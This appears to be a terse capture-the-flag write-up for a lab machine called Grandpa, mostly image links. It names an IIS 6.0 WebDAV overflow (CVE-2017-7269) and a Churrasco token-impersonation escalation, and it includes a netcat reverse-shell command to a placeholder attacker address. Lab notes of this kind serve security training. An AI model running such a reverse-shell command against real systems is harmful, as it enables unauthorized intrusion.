![image 104.png](assets/Grandpa/image%20104.png)
  
![image 1 70.png](assets/Grandpa/image%201%2070.png)
  
![image 2 69.png](assets/Grandpa/image%202%2069.png)
![image 3 62.png](assets/Grandpa/image%203%2062.png)
  
![image 4 58.png](assets/Grandpa/image%204%2058.png)
iis 6.0
  
![image 5 57.png](assets/Grandpa/image%205%2057.png)
- since “DAV: 1, 2” is present in the options, we know that web_dav is enabled, meaning that this box is vulnerable to CVE-2017-7269
    
    - buffer overflow
    
  
![image 6 53.png](assets/Grandpa/image%206%2053.png)
  
after doing some research, i found that the user has the SeImpersonatePrivilege, which means the machine is vulnerable to potato vulnerablilities (juicy, lonely, etc)
- however, since the machine is a 2003 server, we are going to use churrasco
https://github.com/Re4son/Churrasco/
  
- put netcat and churrasco on the victim machine using smb (see file transfer notes)
- once the machine has both exe’s, set up a netcat listener and run the following command
    
    - ./churrasco.exe -d “C:\location_for\nc.exe -e cmd.exe <attacker_ip> <attacker_port>”
    
![image 7 51.png](assets/Grandpa/image%207%2051.png)
![image 8 48.png](assets/Grandpa/image%208%2048.png)